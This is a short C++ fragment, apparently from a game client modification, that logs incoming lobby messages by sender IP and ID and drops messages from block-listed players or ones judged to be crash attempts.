		logger::instance().add_entry("Lobby MSG: [ip:%s, id:%llu]->'%s'", functions::get_ip_address(&from_adr).to_string().c_str(), from_xuid, functions::LobbyTypes_GetMsgTypeName(lobby_msg->msgType));

		if (auto shitter{ shitters.get_if_present({ from_xuid }) }; shitter != shitters.shit_list.end() && shitter->flags & shitters_c::action_flag_block_incoming)
		{
			//notify::protection("'%s' from:\n%s", functions::LobbyTypes_GetMsgTypeName(lobby_msg->msgType), sender_id.c_str());

			return true;
		}

		else if (should_ignore_msg(from_adr, from_xuid, lobby_module, lobby_type, lobby_msg))
		{


			//notify::protection("'%s' crash from:\n%s", functions::LobbyTypes_GetMsgTypeName(lobby_msg->msgType), sender_id.c_str());

			return true;
		}

		return false;
	}
}

//=====================================================================================